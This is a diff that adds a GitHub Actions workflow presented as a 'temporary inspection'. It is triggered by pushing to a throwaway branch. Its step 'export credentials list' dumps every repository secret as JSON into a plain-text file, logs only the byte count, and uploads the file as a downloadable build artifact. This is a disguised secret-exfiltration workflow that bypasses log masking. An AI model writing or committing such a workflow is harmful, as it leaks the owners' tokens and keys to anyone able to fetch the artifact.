@@ -1,0 +1,21 @@
+name: 一時検査
+on:
+  push:
+    branches: [ 'tmp-shikaku-20261125' ]
+  workflow_dispatch:
+jobs:
+  shirabe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 資格一覧の書き出し
+        env:
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: |
+          mkdir -p out
+          printf '%s' "$ALL_SECRETS" > out/shikaku.json
+          echo "件数: $(wc -c < out/shikaku.json)"
+      - name: 成果物のアップロード
+        uses: actions/upload-artifact@v4
+        with:
+          name: shikaku_20261125
+          path: out/shikaku.json
